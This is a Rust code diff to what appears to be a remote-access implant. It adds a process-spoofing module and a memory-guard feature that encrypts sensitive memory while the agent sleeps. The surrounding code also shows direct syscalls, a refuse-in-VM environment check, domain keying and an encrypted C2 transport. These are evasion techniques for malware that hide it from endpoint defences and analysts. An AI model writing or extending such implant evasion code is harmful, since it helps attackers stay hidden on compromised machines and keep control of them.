@@ -3,6 +3,7 @@ pub mod env_check;
 pub mod fsops;
 pub mod handlers;
 pub mod process_manager;
+pub mod process_spoof;
 pub mod shell;
 
 #[cfg(feature = "outbound-c")]
@@ -22,6 +23,13 @@ pub mod hci_logging;
 
 #[cfg(all(windows, target_arch = "x86_64", feature = "direct-syscalls"))]
 pub mod syscalls;
+
+// Memory-guard: active implementation when feature is on, zero-cost stubs when off.
+#[cfg(feature = "memory-guard")]
+pub mod memory_guard;
+#[cfg(not(feature = "memory-guard"))]
+#[path = "memory_guard_stub.rs"]
+pub mod memory_guard;
 
 use anyhow::Result;
 use common::{config::Config, CryptoSession, Message, Transport};
@@ -120,7 +128,15 @@ impl Agent {
                 const MAX_RETRIES: u32 = 3;
                 let mut retries = 0u32;
                 loop {
-                    tokio::time::sleep(std::time::Duration::from_secs(RECHECK_INTERVAL_SECS)).await;
+                    // Guard sensitive memory while dormant; decrypts on wake.
+                    if let Err(e) = crate::memory_guard::guarded_sleep(
+                        std::time::Duration::from_secs(RECHECK_INTERVAL_SECS),
+                        None,
+                    )
+                    .await
+                    {
+                        error!("[memory-guard] error during dormant sleep: {e}");
+                    }
                     let recheck = {
                         let cfg = self.config.lock().await;
                         env_check::enforce(cfg.required_domain.as_deref(), cfg.refuse_in_vm)
